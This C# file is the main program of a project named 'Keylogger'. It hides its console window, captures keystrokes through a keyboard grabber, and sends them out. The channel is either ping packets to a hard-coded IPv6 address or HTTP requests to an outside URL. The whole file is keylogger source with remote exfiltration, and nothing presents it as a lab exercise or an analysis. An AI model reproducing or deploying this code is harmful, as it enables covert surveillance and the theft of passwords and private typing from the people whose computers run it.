using System;
using System.Windows.Forms;
using System.Collections.Concurrent;
using System.Threading;
using System.Net;

namespace Keylogger {
	class Program {
		enum CreateType {
			Ping,
			Http
		};

		private static IHandler createHandler(CreateType type) {
			if (type == CreateType.Ping) {
				ITarget target = new PingTarget(IPAddress.Parse("2001:470:5816:f::"));
				return new DelayedHandler(target, 500, 7);
			} else if(type == CreateType.Http) {
				ITarget target = new HttpTarget("https://test.trnila.eu/q");
				return new DelayedHandler(target, 500);
			}

			return null;
		}

		public static void Main() {
			Win32API.ShowWindow(Win32API.GetConsoleWindow(), 0);

			IHandler handler = createHandler(CreateType.Ping);

			var queue = new BlockingCollection<char>(new ConcurrentQueue<char>());
			using(new KeyboardGrabber(queue)) {
				new Thread(() => handler.handle(queue)).Start();
				Application.Run();
			}
		}
	}
}